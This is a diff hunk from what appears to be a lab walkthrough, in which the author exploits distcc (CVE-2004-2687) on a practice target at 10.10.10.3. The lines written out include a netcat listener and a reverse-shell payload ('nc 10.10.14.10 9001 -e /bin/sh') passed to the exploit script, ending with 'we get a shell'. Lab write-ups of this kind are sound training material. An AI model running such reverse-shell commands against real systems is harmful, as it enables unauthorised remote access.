@@ -33,7 +33,7 @@ If it is able to connect to the host it will send the payload and hopefully give
 Let's give it a try. I started by copying the code and writing it to a file naming it CVE-2004-2687.py, did chmod +x CVE-2004-2687.py \
 the file is ready to be used. First I started a listener on my attacking machine with nc -lvnp 9001 and then used the following command \
 ./CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.10 9001 -e /bin/sh" No good, got errors. \
-Then I tried. python3 CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.10 9001 -e /bin/sh" I got a connected to remote service Ok but then the \
+Then I tried. python3 CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.10 9001 -e /bin/sh" I got a connected to remote service Ok but then the
 socket timed out instantly killing the connection. I went back to the exploit and read the comments, it mentioned that python3 is to new.
 So I was going to work my way down from python3 to python. \
 Next up, python2 CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.10 9001 -e /bin/sh" Success, we get a shell!
